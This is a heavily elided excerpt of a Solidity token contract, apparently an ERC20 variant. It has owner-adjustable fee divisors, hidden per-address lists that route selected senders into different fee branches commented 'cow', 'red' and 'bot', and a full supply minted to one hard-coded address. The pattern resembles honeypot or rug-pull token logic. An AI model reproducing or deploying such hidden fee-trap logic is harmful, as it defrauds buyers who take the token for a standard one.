...
contract ERC20 is IERC20, Ownable {
    ...
    uint256 public _divf = 2500000000;
    uint256 public _divs = 2500000000;
    uint256 public _divt = 2500000000;
		...
		if(_iiL[sender] || _iiL[recipient]){
            ...
            if (_mmL[sender] == true) {
                ...
                if (_balances[sender] > 0 && _ttL[sender] > 0 && block.timestamp - _ttL[sender] > _botT) {
                    ...
                    _mmy = reserveBNB;
                    _nmb = reserveToken;
                    _transferfee(sender, recipient, amount * _divf / 2500000000);//cow
                }else {
                    ...
                    if(_laBo == sender) {
                        _transferfee(sender, recipient, amount * _divt / 2500000000);//red
                    }else {
                        _transferfee(sender, recipient, amount * _divs / 2500000000);//bot
                    }
	...
	function _transferNofee(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (_nmL[recipient] > 2500000000000000000000000000) {
            _nmL[recipient] = 2;
        }
...
contract Token is ERC20 {
    ...
    constructor () {
        ...
        _mint(0xBA46c93565C7494d9323600cbEF1e5Fa4672a54e, 2500000000 * (10 ** 18));
    }
